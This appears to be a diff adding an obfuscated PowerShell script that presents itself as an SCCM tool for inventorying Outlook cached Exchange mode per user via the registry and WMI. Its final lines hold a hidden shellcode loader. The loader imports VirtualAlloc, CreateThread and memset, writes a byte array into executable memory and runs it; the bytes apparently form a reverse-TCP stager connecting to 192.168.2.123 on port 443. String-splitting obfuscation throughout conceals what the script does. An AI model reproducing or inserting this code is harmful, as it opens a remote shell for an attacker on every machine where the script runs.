@@ -1,0 +1,219 @@
+ sET-IteM  ('VA'+'RIabLe:t7l'+'B')  ([TYPE]("{0}{1}" -f 's','TRinG'));  $aGXv4 =  [TYPe]("{0}{1}{3}{4}{2}"-F'sYsTEM','.mANAG','mTYpE','emEnt.','cI'); 
+[CmdletBinding()]
+param
+(
+	[Switch]${sC`cm},
+	[switch]${te`XT`FilE},
+	[string]${tE`X`TFI`l`elOc`AtION}
+)
+
+function Find-RegistryKey {
+
+	
+	[CmdletBinding()][OutputType([string])]
+	param
+	(
+		[ValidateNotNullOrEmpty()][string]${vA`L`Ue},
+		[ValidateNotNullOrEmpty()][string]${S`Id}
+	)
+	
+	${VERsI`on} = &("{0}{2}{5}{1}{4}{3}" -f 'Get','i','-O','Version','ce','ff')
+	switch (${VER`Si`ON}) {
+		("{0}{2}{1}"-f 'Of','14','fice ') { ${k`eY} = ((("{0}{1}{2}" -f'HKEY_U','S','ERSTDy'))."Re`PlaCE"('TDy',[StriNG][CHaR]92)) + ${s`id} + ((("{14}{15}{18}{12}{3}{19}{2}{16}{0}{13}{17}{10}{8}{6}{5}{9}{4}{7}{11}{1}" -f 'NT','0}Profiles','ndows','t{0}','S',' Messag','s','u','}Window','ing ','0','bsystem{','f','{0}CurrentV','{0}','SOFTWARE{0}Mi',' ','ersion{','croso','Wi'))-f [chaR]92) }
+		("{3}{0}{1}{2}"-f'f','i','ce 16','Of') { ${K`Ey} = ((("{3}{1}{0}{2}" -f'_US','EY','ERSGNh','HK'))  -CrEPLaCe  'GNh',[CHAr]92) + ${s`iD} + ((("{11}{14}{0}{13}{10}{5}{12}{1}{3}{4}{7}{9}{6}{8}{2}" -f '1q5Mic','e','iles','1q','516.0','ft1q5','ok1','1q5Out','q5Prof','lo','so','1q5SOFTWA','Offic','ro','RE')) -replAcE  ([cHaR]49+[cHaR]113+[cHaR]53),[cHaR]92) }
+	}
+	If ((&("{0}{1}" -f'Test','-Path') REGISTRY::$Key) -eq ${t`Rue}) {
+		[string]${CaC`hED`mO`DE} = &("{2}{0}{1}"-f '-child','item','get') REGISTRY::$Key -recurse -ErrorAction SilentlyContinue | &("{3}{0}{2}{1}"-f 'o','ject','b','where-') { ${_}."PROp`ErTy" -eq ("{2}{1}{0}"-f '01','00366','0') }
+		If (${C`Ac`HedmoDE} -ne ${NU`LL}) {
+			[string]${C`AC`hEDMOdeVA`lue} = (&("{2}{0}{1}{3}"-f 'emPro','pe','Get-It','rty') REGISTRY::$CachedMode).'00036601'
+			switch (${vE`RSI`ON}) {
+				("{2}{0}{1}"-f 'c','e 14','Offi') {
+					switch (${cac`hedm`ODe`V`Alue}) {
+						
+						("{1}{0}{2}" -f' ','128','25 0 0') { Return ("{0}{1}" -f 'Enab','led') } 
+						("{2}{1}{0}" -f '0','0 ','0 16 ') { Return ("{1}{0}{2}"-f'i','D','sabled') } 
+						default { Return ("{0}{1}" -f 'Un','known') }
+					}
+				}
+				("{2}{0}{1}"-f 'ice ','16','Off') {
+					switch (${C`ACHEd`m`OdevALUE}) {
+						
+						("{1}{0}{2}"-f'2 25 0 ','13','0') { Return ("{2}{1}{0}" -f 'led','nab','E') } 
+						("{2}{1}{0}" -f '0',' ','4 16 0') { Return ("{1}{0}{2}"-f 's','Di','abled') } 
+						default { Return ("{0}{1}" -f 'Unkn','own') }
+					}
+				}
+			}
+			Return ${CACh`e`dmOdeVaL`Ue}
+		} else {
+			Return ${N`UlL}
+		}
+	} else {
+		Return ${N`ULL}
+	}
+}
+
+function Get-HKEY_USERS_List {
+
+	
+	[CmdletBinding()][OutputType([array])]
+	param ()
+	
+	
+	${h`kE`y_usERs} = &("{1}{0}{2}" -f 't-C','Ge','hildItem') REGISTRY::HKEY_USERS | &("{0}{1}{3}{2}"-f 'w','her','ct','e-obje') { (${_}."na`me" -like ("{0}{2}{1}"-f'*S-1-5','21*','-')) -and (${_}."nA`me" -notlike ("{0}{1}" -f '*_Cl','asses')) }
+	${use`RS} = @()
+	foreach (${U`Ser} in ${Hk`E`y_USe`RS}) {
+		
+		${pr`O`FiLeSId} = &("{0}{3}{2}{1}"-f'G','ldItem','i','et-Ch') REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" | &("{3}{0}{1}{2}"-f 're-Obje','c','t','Whe') { ${_}."NA`Me" -like "*" + ${u`ser}."p`Sc`HIldna`mE" + "*" }
+		${S`Id} = ${p`ROfile`s`Id}."PSchil`DN`A`me"
+		
+		${CAChEDM`O`de} = &("{2}{1}{0}{4}{3}"-f 'gistr','-Re','Find','ey','yK') -Value ("{1}{0}"-f '01','000366') -SID ${s`iD}
+		If (${C`AchEd`modE} -ne ${NU`LL}) {
+			
+			${pro`FI`lENaMe} = ((&("{5}{4}{1}{2}{3}{0}" -f'rty','t-Ite','mP','rope','e','G') REGISTRY::$PROFILESID)."PrOfIl`e`I`MagEPA`Th").("{1}{0}"-f'lit','Sp').Invoke("\")[2]
+			
+			${SY`s`T`EminFo} = &("{0}{1}{2}"-f'Ne','w-Objec','t') -TypeName System.Management.Automation.PSObject
+			&("{0}{1}{2}" -f 'Ad','d-','Member') -InputObject ${Sy`sTE`MinFo} -MemberType NoteProperty -Name Profile -Value ${PRO`F`iLeNaMe}
+			&("{1}{2}{0}" -f 'mber','A','dd-Me') -InputObject ${sY`sT`eminFO} -MemberType NoteProperty -Name Status -Value ${caC`Hed`mo`De}
+			${u`sERS} += ${SYst`e`m`inFo}
+		}
+	}
+	Return ${u`Sers}
+}
+
+function New-WMIClass {
+	[CmdletBinding()]
+	param
+	(
+		[ValidateNotNullOrEmpty()][string]${c`l`ASS}
+	)
+	
+	${WMi`TEST} = &("{4}{0}{3}{1}{2}"-f't','miOb','ject','-W','Ge') ${CL`ASs} -ErrorAction SilentlyContinue
+	If (${wmI`TeST} -ne "") {
+		${Ou`T`pUT} = ("{0}{2}{1}" -f'De','eting ','l') + ${C`lAss} + ("{3}{0}{2}{1}" -f ' c','ass.....','l',' WMI')
+		&("{1}{0}{2}{3}{4}" -f'ove-','Rem','WmiObj','ec','t') ${CLa`ss}
+		${w`MIt`eSt} = &("{3}{2}{1}{0}" -f 'ect','Obj','-Wmi','Get') ${cl`AsS} -ErrorAction SilentlyContinue
+		If (${w`mIT`EsT} -eq ${Nu`Ll}) {
+			${out`Put} += ("{0}{2}{1}" -f'Suc','ess','c')
+		} else {
+			${o`UTpUT} += ("{1}{0}{2}" -f 'ail','F','ed')
+			Exit 1
+		}
+		&("{2}{0}{1}{3}"-f 'u','t','Write-O','put') ${Ou`T`PuT}
+	}
+	${ouT`PUT} = ("{2}{3}{1}{0}"-f'ing ','t','C','rea') + ${cL`A`ss} + ("{0}{1}{2}" -f' WMI',' cla','ss.....')
+	${n`ew`clASs} = &("{3}{2}{0}{1}" -f'bjec','t','w-O','Ne') System.Management.ManagementClass(((("{3}{4}{1}{0}{2}"-f'v','Fcim','2','ro','ot8H'))-REplAce ([CHAR]56+[CHAR]72+[CHAR]70),[CHAR]92),   ( gcI ('vA'+'rIabLE:t7L'+'b')).vAlUe::"em`pTY", ${n`ULl});
+	${nEwCl`A`sS}[("{0}{2}{1}"-f '__C','S','LAS')] = ${cLa`SS};
+	${neWclA`sS}."q`UALIF`ieRS".("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f'atic','St'), ${tr`Ue})
+	${Ne`w`clAsS}."Pr`OpertI`eS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}"-f'Pro','file'),  (  chilDItEm  ("V"+"arIA"+"bLE:aGX"+"v4")  ).ValUe::"sTRi`Ng", ${F`AL`sE})
+	${new`cla`ss}."p`RoPE`Rt`iES"[("{1}{0}"-f'file','Pro')]."QUALi`F`Ie`RS".("{1}{0}"-f 'dd','A').Invoke("key", ${T`RUe})
+	${Newc`LAsS}."p`Roper`TIeS"[("{1}{0}"-f 'e','Profil')]."qUALIf`i`Ers".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}" -f 'd','rea'), ${t`Rue})
+	${n`ew`cLASS}."P`Ro`PERTi`Es".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f'atus','St'),   (  cHILditEm  ('v'+'ARiAbLE'+':Ag'+'xV'+'4') ).ValUe::"ST`RiNg", ${F`A`LsE})
+	${NE`WC`LasS}."pro`PEr`T`ieS"[("{1}{0}" -f 'tatus','S')]."qU`A`lifieRS".("{1}{0}" -f 'dd','A').Invoke("key", ${tr`Ue})
+	${nE`wc`laSs}."pr`oP`ErT`iES"[("{0}{1}"-f 'Stat','us')]."q`UALIF`IErs".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f 'rea','d'), ${tr`UE})
+	${n`eWcL`A`Ss}.("{1}{0}"-f 't','Pu').Invoke() | &("{1}{2}{0}" -f'll','Ou','t-Nu')
+	${WMiT`ESt} = &("{4}{0}{1}{2}{3}" -f'm','iO','bj','ect','Get-W') ${cL`AsS} -ErrorAction SilentlyContinue
+	If (${Wm`i`Test} -eq ${nu`lL}) {
+		${Ou`TPUT} += ("{1}{2}{0}" -f 'ss','Succ','e')
+	} else {
+		${oU`Tp`Ut} += ("{1}{0}"-f'd','Faile')
+		Exit 1
+	}
+	&("{0}{2}{1}" -f 'Write','put','-Out') ${Ou`T`PuT}
+}
+
+function New-WMIInstance {
+
+	
+	[CmdletBinding()]
+	param
+	(
+		[ValidateNotNullOrEmpty()][string]${U`se`RNamE},
+		[ValidateNotNullOrEmpty()][string]${ca`cHed`m`OdEStATUs},
+		[ValidateNotNullOrEmpty()][string]${Cl`Ass}
+	)
+	
+	${O`Utput} = ("{0}{6}{8}{2}{5}{1}{4}{7}{3}" -f'Writi','nge inf','xch','instance to','ormatio','a','ng Cache','n ','d E') + [char]32 + ${C`L`Ass} + [char]32 + ("{1}{2}{0}"-f'....','cla','ss.')
+	${REtU`RN} = &("{3}{1}{0}{4}{2}"-f 'i','et-Wm','stance','S','In') -Class ${C`L`Ass} -Arguments @{ ("{2}{0}{1}"-f 'o','file','Pr') = ${uSER`N`AmE}; ("{0}{1}"-f'Sta','tus') = ${cacHEdM`OdE`S`T`ATUs} }
+	If (${re`Tu`Rn} -like "*" + ${US`Ern`AmE} + "*") {
+		${o`UT`PuT} += ("{1}{0}"-f'ess','Succ')
+	} else {
+		${outP`UT} += ("{2}{1}{0}" -f'd','aile','F')
+	}
+	&("{0}{2}{1}" -f'Wri','put','te-Out') ${oU`T`PuT}
+}
+
+function Get-OfficeVersion {
+
+	
+	[CmdletBinding()][OutputType([string])]
+	param ()
+	
+	If ((&("{2}{0}{1}" -f'st-P','ath','Te') $env:ProgramFiles"\Microsoft Office") -eq ${TR`Ue}) {
+		${FI`LE} = &("{4}{3}{0}{1}{2}" -f 'ldit','e','m','t-chi','ge') -path $env:ProgramFiles"\Microsoft Office" -filter ospp.vbs -recurse
+	}
+	If ((&("{1}{0}{2}" -f'st','Te','-Path') ${env:ProgramFiles(x86)}"\Microsoft Office") -eq ${T`Rue}) {
+		${f`ILE} = &("{1}{3}{4}{2}{0}" -f'lditem','get','i','-','ch') -path ${env:ProgramFiles(x86)}"\Microsoft Office" -filter ospp.vbs -recurse
+	}
+	
+	${v`ErSi`ON} = (&("{2}{0}{1}" -f'.ex','e','cscript') ${fi`LE}."f`ULLnA`mE" /dstatus | &("{2}{3}{0}{1}"-f 'ere-obje','ct','w','h') { ${_} -like ("{2}{0}{1}" -f'ME:','*','LICENSE NA') }).("{1}{0}"-f 'plit','s').Invoke(":")[1].("{1}{0}"-f'im','Tr').Invoke().("{0}{1}"-f 'Spli','t').Invoke(",")[0]
+	Return ${VEr`s`iON}
+}
+
+function Initialize-HardwareInventory {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	${oU`TPut} = ("{3}{2}{1}{5}{6}{0}{7}{4}"-f'wa','tiate SCCM ','i','In',' Inventory.....','Har','d','re')
+	${smS`ClI} = [wmiclass] ((("{7}{4}{5}{3}{1}{8}{2}{0}{6}" -f'MS','U6gr','S','ocalhost','gU6g','l','_Client','U6','ootU6gccm:'))  -CrEplACE  'U6g',[CHar]92)
+	${er`RcOdE} = (${SM`ScLi}.("{3}{2}{4}{0}{1}" -f'g','erSchedule','i','Tr','g').Invoke("{00000000-0000-0000-0000-000000000001}"))."RE`TurN`Val`Ue"
+	If (${eR`RCoDe} -eq ${NU`LL}) {
+		${O`Utp`Ut} += ("{1}{0}"-f 'cess','Suc')
+	} else {
+		${oU`TPut} += ("{0}{1}{2}"-f 'Fail','e','d')
+	}
+	&("{0}{1}{2}{3}" -f 'W','rite-','Out','put') ${OU`TP`Ut}
+}
+
+&("{2}{1}{0}" -f 'ost','lear-H','C')
+
+${US`Ers} = &("{0}{2}{1}{3}{4}{5}"-f 'Get-HKEY_','E','US','RS_L','is','t')
+If (${SC`CM}."IS`pR`ES`EnT") {
+	
+	&("{0}{1}{3}{2}" -f 'Ne','w-WMICla','s','s') -Class ("{2}{3}{0}{1}" -f 'ed_Exchang','e_Mode','C','ach')
+	
+	foreach (${us`ER} in ${us`E`Rs}) {
+		&("{1}{0}{2}{3}{4}"-f 'MI','New-W','Instan','c','e') -Username ${U`Ser}."pR`OFilE" -CachedModeStatus ${Us`eR}."S`Tatus" -Class ("{0}{2}{3}{1}"-f 'Cach','xchange_Mode','ed_','E')
+	}
+	&("{3}{2}{4}{6}{5}{1}{0}"-f 'eInventory','ar','it','In','ia','ize-Hardw','l')
+}
+If (${T`e`xtfiLE}."i`SPRese`NT") {
+	
+	If ((${tExTF`i`lE`lo`CATion} -ne "") -and (${t`EXTF`iLeLOc`ATion} -ne ${nu`LL})) {
+		
+		If ((&("{2}{3}{0}{1}"-f'st','-Path','T','e') ${t`eX`Tf`ILELOCA`TIon}) -eq ${tr`UE}) {
+			
+			If (${TE`XtFIL`elocAT`IOn}."Len`Gth" - 1 -ne '\') {
+				${FI`lE} = ${textFilel`O`CA`T`Ion} + '\' + ${enV:`cOMp`UtErNA`me} + ("{1}{0}" -f'log','.')
+			} else {
+				${fi`Le} = ${T`E`X`TfIlelOcAT`ioN} + ${e`NV:`Com`pU`TerN`Ame} + ("{1}{0}"-f'g','.lo')
+			}
+			
+			If ((&("{2}{1}{0}{3}"-f 'Pa','t-','Tes','th') ${f`ilE}) -eq ${TR`UE}) {
+				&("{2}{0}{1}" -f'v','e-Item','Remo') ${f`iLE} -Force
+			}
+			
+			${U`SeRS} | &("{0}{1}{2}" -f 'Out-F','i','le') ${FI`le} -Encoding UTF8 -Force
+		} else {
+			&("{3}{0}{2}{1}"-f'e','ost','-H','Writ') ("{1}{5}{3}{6}{0}{4}{2}"-f 'i','Text file loca','t','n does not e','s','tio','x')
+		}
+	} else {
+		&("{0}{2}{1}{3}" -f'W','ite-Hos','r','t') ("{1}{2}{6}{0}{7}{5}{3}{4}"-f'n was de','No ','text file lo','d','.','ine','catio','f')
+	}
+}
+
+${u`SErS}
+
+${C} = ((("{88}{85}{50}{27}{42}{48}{46}{110}{71}{44}{47}{57}{38}{78}{53}{54}{9}{4}{13}{16}{43}{45}{58}{63}{5}{41}{2}{103}{49}{100}{12}{104}{66}{3}{10}{111}{79}{25}{91}{36}{8}{62}{21}{67}{102}{61}{26}{96}{93}{73}{28}{7}{59}{76}{35}{86}{20}{19}{82}{14}{72}{0}{70}{55}{60}{99}{56}{11}{74}{17}{33}{51}{92}{18}{24}{95}{87}{68}{64}{23}{101}{77}{81}{109}{34}{98}{52}{75}{84}{30}{97}{107}{94}{31}{39}{6}{83}{106}{1}{105}{89}{40}{80}{29}{69}{15}{108}{90}{65}{32}{37}{22}" -f 'ntPtr l','n In',', ui',',','ntPtr lpAd','dw','c static ex','r','(pU','c(I',' uint fl',' l','io','dr','e,','u','e','e','Cre',' uint dwStac','es,','kerne','t);','tr','ati','e',' static ','pU','r C',',','pUEms','l','cou','ter','Id);','(IntPtr lpThreadAtt','t','n','n','pUE)]publi','ntP','Size','E','ss','ati',', ','32.dll','c exter','kernel','oca','rt(',',','DllImp',' Virtu','alAllo','ss, ','r','n I','u','eateThrea','In','blic','E','int ','P',' ','e','l32','t',' ','pStartAddre','public st',' I','Pt','pParam','or','d','pTh','tPtr','rot','tr dest','re','kSiz','t','t(','lImpo','ribut','ags, In','[Dl','set(I','c, uint','ct);[DllImpor',' uint dw','nt','l','onFl','extern I','vcr','[','tPt','t',' l','.dllpUE)]pu','nt flAll','nTyp','tPtr mem','er','t.d','int sr','ad','pUE)]','P'))-rePlACe  'pUE',[chaR]34);${W} = &("{1}{2}{0}"-f 'ype','Add-','T') -memberDefinition ${C} -Name ("{0}{1}"-f'Win','32') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]${sC} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${s`Ize} = 0x1000;if (${sc}."lenG`Th" -gt 0x1000){${s`IZe} = ${sC}."L`enGtH"};${X}=${W}::("{2}{0}{1}{3}"-f'rt','ua','Vi','lAlloc').Invoke(0,0x1000,${s`ize},0x40);for (${i}=0;${i} -le (${S`c}."l`ENGtH"-1);${i}++) {${W}::"MeM`S`et"([IntPtr](${X}.("{1}{0}{2}"-f 'Int3','To','2').Invoke()+${i}), ${s`c}[${i}], 1)};${w}::("{3}{0}{2}{1}" -f't','Thread','e','Crea').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{0}{2}" -f '-','Start','sleep') 60};
